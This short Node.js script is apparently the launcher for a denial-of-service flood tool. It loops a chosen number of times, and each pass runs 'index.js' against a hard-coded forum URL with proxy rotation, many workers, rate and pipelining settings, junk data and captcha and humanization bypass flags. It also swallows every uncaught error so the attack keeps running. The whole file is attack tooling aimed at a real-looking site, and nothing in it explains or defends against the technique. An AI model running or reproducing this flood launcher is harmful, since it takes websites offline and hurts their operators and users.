const execSync = require('child_process').execSync;
var thread = process.argv[3]
var url = process.argv[2]

function get() {
    for (x = 0; x < thread; x++) {
        execSync(`node index.js "https://forum.tendust.xyz/" --humanization true --mode tlsfl --precheck false --proxy proxy.txt --time 3000 --pool 20 --uptime 15000 --workers 50 --proxylen 3650 --delay 25000 --junk true --pipe 500 --rate 64 -- captcha true`)
    }
}
get()

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});